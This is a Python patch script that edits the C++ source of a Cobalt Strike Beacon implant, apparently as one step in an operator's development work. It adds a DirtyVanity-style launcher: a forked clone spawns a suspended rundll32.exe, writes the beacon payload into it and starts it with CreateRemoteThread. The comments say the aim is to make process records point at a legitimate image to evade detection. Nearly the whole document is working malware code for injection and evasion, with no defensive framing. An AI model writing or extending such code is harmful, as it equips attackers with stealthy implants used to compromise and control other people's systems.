#!/usr/bin/env python3
"""DirtyVanity final: the clone is a LAUNCHER (official PoC pattern).

The cloned runtime's state (heap locks, RPC bindings) is a torn snapshot:
a full beacon payload inside the clone fastfails in RPCRT4 on its first
RPC touch (live: both spawn-time and pristine boot-time forks). The
public PoC runs pure shellcode that spawns a CHILD process for exactly
this reason. Upgrade the trampoline: on go, the clone spawns a fresh
suspended host, mirrors the payload in, CreateRemoteThread - the new
session comes from the healthy host while every process/thread record
inside the clone points at our own legitimate image."""
import io

p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\inject_tier2.cpp"
s = io.open(p, encoding="utf-8").read()

old = """typedef struct {
	volatile LONG go;
	char * entry;
	void * param;
} DV_MAILBOX;

static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
static HANDLE dv_clone_handle = NULL;
static DWORD  dv_clone_pid = 0;

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	((void (*)(void *))dv_mailbox.entry)(dv_mailbox.param);
	for (;;)
		Sleep(60000);
}
"""
assert s.count(old) == 1
new = """typedef struct {
	volatile LONG go;
	char * payload;   /* dll bytes already mirrored into the clone (RX) */
	int    plen;
	void * param;     /* parameter blob already mirrored (RW) */
	int    plen_arg;
} DV_MAILBOX;

static DV_MAILBOX dv_mailbox = { 0, NULL, 0, NULL, 0 };
static HANDLE dv_clone_handle = NULL;
static DWORD  dv_clone_pid = 0;

/* runs INSIDE the clone. kernel32 only - the cloned runtime's RPC state
 * is a torn snapshot, so anything that touches it dies; the fresh host
 * gets a clean world. Pattern follows the public PoC (its shellcode
 * also spawns a child rather than living in the clone). */
static void dv_clone_launch(char * payload, int plen, void * param, int plen_arg) {
	STARTUPINFOA        si;
	PROCESS_INFORMATION pi;
	void *              remote = NULL;
	void *              rparam = NULL;
	SIZE_T              got = 0;
	DWORD               oldp = 0;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
	                    CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return;

	remote = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen,
	                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remote == NULL || !WriteProcessMemory(pi.hProcess, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
		goto done;
	VirtualProtectEx(pi.hProcess, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);

	if (plen_arg > 0) {
		rparam = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen_arg,
		                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (rparam != NULL)
			WriteProcessMemory(pi.hProcess, rparam, param, (SIZE_T)plen_arg, &got);
	}

	{
		HANDLE ht = CreateRemoteThread(pi.hProcess, NULL, 0,
		                               (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
		if (ht != NULL)
			CloseHandle(ht);
	}

done:
	/* leave the host's (never-started) main thread suspended; the
	 * injected beacon owns the process from here */
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void dv_nursery_trampoline(void * unused) {
	(void)unused;
	while (!dv_mailbox.go)
		Sleep(200);
	dv_clone_launch(dv_mailbox.payload, dv_mailbox.plen,
	                dv_mailbox.param, dv_mailbox.plen_arg);
	for (;;)
		Sleep(60000);
}
"""
s = s.replace(old, new)

old2 = """	mb.go    = 1;
	mb.entry = (char *)remote + offset; /* job payloads carry their loader offset */
	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {"""
assert s.count(old2) == 1
# mb declaration + fields
old3 = """	DV_MAILBOX mb;

	if (dv_clone_pid == 0 || dv_clone_handle == NULL)
		return FALSE;"""
assert s.count(old3) == 1
s = s.replace(old3, """	DV_MAILBOX mb;

	if (dv_clone_pid == 0 || dv_clone_handle == NULL)
		return FALSE;
	(void)offset; /* the clone launches the payload at its base (offset 0
	              * convention); job-style offsets are not routed here */"""
)
s = s.replace("""	mb.go    = 1;
	mb.entry = (char *)remote + offset; /* job payloads carry their loader offset */
	mb.param = rparam;""",
"""	mb.go      = 1;
	mb.payload = (char *)remote;
	mb.plen    = dllen;
	mb.param   = rparam;
	mb.plen_arg = plen;""")
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("launcher trampoline in")
